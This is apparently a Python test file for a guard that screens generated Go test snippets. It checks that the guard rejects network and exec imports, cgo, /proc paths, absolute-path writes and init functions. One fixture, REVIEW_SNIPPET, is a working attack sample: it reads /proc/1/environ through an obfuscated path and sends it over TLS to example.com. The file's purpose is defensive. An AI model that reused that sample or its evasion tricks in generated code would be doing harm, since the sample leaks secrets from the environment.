# AI-generated with Claude Code from a human-approved spec and plan; each task independently AI-reviewed; integrated and verified by Lionel Derrick Roxas.
from app.guard import check_snippet, render_snippet, test_names
from app.models import TestSnippet

MOD = "github.com/montanaflynn/stats"


def snip(code="func TestX(t *testing.T) {}", imports=("testing",)) -> TestSnippet:
    return TestSnippet(test_plan=[], imports=list(imports), code=code, suspected_bugs=[])


def test_clean_snippet_passes():
    assert check_snippet(snip(), MOD) == []


def test_denied_and_third_party_imports():
    problems = check_snippet(snip(imports=["testing", "os/exec", "net/http", "github.com/stretchr/testify/assert"]), MOD)
    assert any("os/exec" in p for p in problems)
    assert any("net/http" in p for p in problems)
    assert any("testify" in p for p in problems)


def test_module_own_packages_allowed():
    assert check_snippet(snip(imports=["testing", MOD + "/sub"]), MOD) == []


def test_code_must_not_contain_package_or_imports_or_build_tags():
    assert check_snippet(snip(code="package stats\nfunc TestX(t *testing.T) {}"), MOD)
    assert check_snippet(snip(code='import "os"\nfunc TestX(t *testing.T) {}'), MOD)
    assert check_snippet(snip(code="//go:build ignore\nfunc TestX(t *testing.T) {}"), MOD)


def test_requires_a_test_function_and_size_cap():
    assert check_snippet(snip(code="func helper() {}"), MOD)
    assert check_snippet(snip(code="func TestX(t *testing.T) {}\n" + "//" + "x" * 50_000), MOD)


def test_render_and_names():
    s = snip(code="func TestA(t *testing.T) {}\n\nfunc TestB(t *testing.T) {}", imports=["testing", "testing"])
    assert render_snippet("stats", s) == 'package stats\n\nimport (\n\t"testing"\n)\n\nfunc TestA(t *testing.T) {}\n\nfunc TestB(t *testing.T) {}\n'
    assert test_names(s.code) == ["TestA", "TestB"]


def test_import_path_injection_rejected():
    problems = check_snippet(snip(imports=['testing"\n\t"os/exec']), MOD)
    assert any("invalid import path" in p for p in problems)


def test_comment_prefixed_import_rejected():
    assert check_snippet(snip(code='/* x */ import "os/exec"\nfunc TestX(t *testing.T) {}'), MOD)


def test_import_word_inside_raw_string_allowed():
    assert check_snippet(snip(code='var s = `\nimport x\n`\nfunc TestX(t *testing.T) {}'), MOD) == []


def test_cgo_and_directives_rejected():
    assert any("'C'" in p for p in check_snippet(snip(imports=["testing", "C"]), MOD))
    assert any("runtime/cgo" in p for p in check_snippet(snip(imports=["testing", "runtime/cgo"]), MOD))
    assert check_snippet(snip(code="//go:linkname x runtime.x\nfunc TestX(t *testing.T) {}"), MOD)
    assert check_snippet(snip(code="// #cgo LDFLAGS: -lm\nfunc TestX(t *testing.T) {}"), MOD)


def test_testmain_and_lowercase_not_test_functions():
    assert test_names("func TestMain(m *testing.M) {}\nfunc TestA(t *testing.T) {}") == ["TestA"]
    assert test_names("func Testlower(t *testing.T) {}") == []
    assert check_snippet(snip(code="func TestMain(m *testing.M) {}"), MOD)


def test_start_process_identifier_rejected_but_not_in_comments_or_strings():
    bad = snip(code="func TestX(t *testing.T) { os.StartProcess(\"x\", nil, nil) }")
    assert any("StartProcess" in p for p in check_snippet(bad, MOD))
    ok = snip(code="// os.StartProcess is banned" + chr(10) + "func TestX(t *testing.T) { _ = \"StartProcess\" }")
    assert not check_snippet(ok, MOD)


def test_proc_path_rejected_in_string_literals_but_not_comments():
    for lit in ('"/proc/self/environ"', "`/proc/1/environ`"):
        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {lit} }}")
        assert any("/proc/" in p for p in check_snippet(bad, MOD)), lit
    ok = snip(code="// never read /proc/self" + chr(10) + "func TestX(t *testing.T) {}")
    assert not check_snippet(ok, MOD)


def test_nan_inf_to_integer_conversion_rejected():
    for expr in ("int(math.Inf(-1))", "int(math.Inf(1))", "int64(math.NaN())", "uint(math.Inf(1))",
                 "uint8( math.NaN() )", "int32(math.Inf(1))", "uintptr(math.NaN())"):
        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {expr} }}", imports=("testing", "math"))
        assert any("platform-dependent" in p for p in check_snippet(bad, MOD)), expr


def test_exact_util_test_lines_rejected():
    code = (
        "func TestFloat64ToInt(t *testing.T) {\n\tcases := []struct{ name string; input float64; want int }{\n"
        '\t\t{"nan", math.NaN(), int(math.Inf(-1))},\n\t\t{"positive inf", math.Inf(1), int(math.Inf(-1))},\n'
        '\t\t{"negative inf", math.Inf(-1), int(math.Inf(-1))},\n\t}\n\t_ = cases\n}'
    )
    problems = check_snippet(snip(code=code, imports=("testing", "math")), MOD)
    assert sum("platform-dependent" in p for p in problems) == 1
    assert any("drop that case" in p for p in problems)


def test_nan_inf_checks_have_no_false_positives():
    code = (
        "// int(math.Inf(1)) would be platform-dependent\n"
        "func TestX(t *testing.T) {\n"
        '\t_ = "int(math.NaN())"\n\t_ = `int64(math.Inf(1))`\n'
        "\t/* uint(math.NaN()) */\n"
        "\tif !math.IsNaN(math.NaN()) || !math.IsInf(math.Inf(1), 1) {\n\t\tt.Fatal()\n\t}\n"
        "\t_ = float64(math.Inf(1))\n\t_ = float32(math.NaN())\n\t_ = int(math.Floor(2.5))\n\t_ = myint(math.NaN())\n}"
    )
    assert check_snippet(snip(code=code, imports=("testing", "math")), MOD) == []


# The blind review's snippet (Task 55): every technique passed the guard before.
REVIEW_SNIPPET = (
    "func init() {\n"
    '\tp := filepath.Join("/", "pr"+"oc", "1", "environ")\n'
    "\tdata, _ := os.ReadFile(p)\n"
    '\tconn, err := tls.Dial("tcp", "example.com:443", nil)\n'
    "\tif err == nil {\n\t\tconn.Write(data)\n\t}\n"
    '\t_ = os.WriteFile("/app/app/zz.py", []byte("x"), 0o644)\n'
    "}\n\n"
    "func TestX(t *testing.T) {\n\tif 1+1 != 2 {\n\t\tt.Fatal(\"math\")\n\t}\n}\n"
)
REVIEW_IMPORTS = ("testing", "os", "path/filepath", "crypto/tls")


def test_blind_review_snippet_is_rejected_for_every_technique():
    problems = "\n".join(check_snippet(snip(code=REVIEW_SNIPPET, imports=REVIEW_IMPORTS), MOD))
    for expected in ("crypto/tls", "filesystem root", "environ", "absolute path literal", "func init("):
        assert expected in problems, expected


def test_root_path_join_rejected():
    for call in ('filepath.Join("/", "etc")', 'path.Join("/", "x")', "filepath.Join( `/` , \"x\")", 'filepath.Join("/")'):
        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {call} }}", imports=("testing", "path", "path/filepath"))
        assert any("filesystem root" in p for p in check_snippet(bad, MOD)), call


def test_network_packages_rejected():
    for imp in ("crypto/tls", "golang.org/x/net", "golang.org/x/net/http2", "net", "net/http", "log/syslog"):
        problems = check_snippet(snip(imports=["testing", imp]), MOD)
        assert any(f"import {imp!r} is not allowed" in p for p in problems), imp


def test_environ_string_literal_rejected():
    for lit in ('"environ"', '"self/" + "environ"', "`/proc/1/environ`"):
        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {lit} }}")
        assert any("environ" in p for p in check_snippet(bad, MOD)), lit
    ok = snip(code="// os.Environ is never read\nfunc TestX(t *testing.T) { _ = environment }")
    assert check_snippet(ok, MOD) == []


def test_absolute_path_writes_rejected():
    for call in ('os.WriteFile("/app/app/zz.py", nil, 0o644)', 'os.Create("/tmp/x")', "os.RemoveAll(`/work`)"):
        bad = snip(code=f"func TestX(t *testing.T) {{ _ = {call} }}", imports=("testing", "os"))
        assert any("absolute path literal" in p for p in check_snippet(bad, MOD)), call


def test_init_and_testmain_rejected_with_actionable_messages():
    bad = check_snippet(snip(code="func init() {}\nfunc TestX(t *testing.T) {}"), MOD)
    assert any("`func init(` is not allowed" in p and "inside the Test functions" in p for p in bad)
    bad = check_snippet(snip(code="func TestMain(m *testing.M) { m.Run() }\nfunc TestX(t *testing.T) {}"), MOD)
    assert any("`func TestMain(` is not allowed" in p for p in bad)
    # a method or a local closure named init is not a package init function
    assert check_snippet(snip(code="func (s *S) init() {}\nfunc TestX(t *testing.T) { init := 1; _ = init }"), MOD) == []


def test_new_rules_have_no_false_positives():
    code = (
        '// filepath.Join("/", "x") and "/proc/1/environ" in a comment are fine\n'
        "func TestX(t *testing.T) {\n"
        "\tdir := t.TempDir()\n"
        '\tif err := os.WriteFile(filepath.Join(t.TempDir(), "x"), []byte("1"), 0o644); err != nil {\n\t\tt.Fatal(err)\n\t}\n'
        '\t_ = filepath.Join(dir, "x")\n'
        '\t_ = path.Join("a", "/")\n'
        "\t/* path.Join(\"/\") */\n"
        "\tif !math.IsNaN(math.NaN()) || strings.Index(\"a/b\", \"/\") != 1 {\n\t\tt.Fatal(\"x\")\n\t}\n}"
    )
    imports = ("testing", "os", "path", "path/filepath", "math", "strings", "errors", "fmt", "sort", "bytes",
               "encoding/json", "time", "regexp", "strconv", "reflect")
    assert check_snippet(snip(code=code, imports=imports), MOD) == []
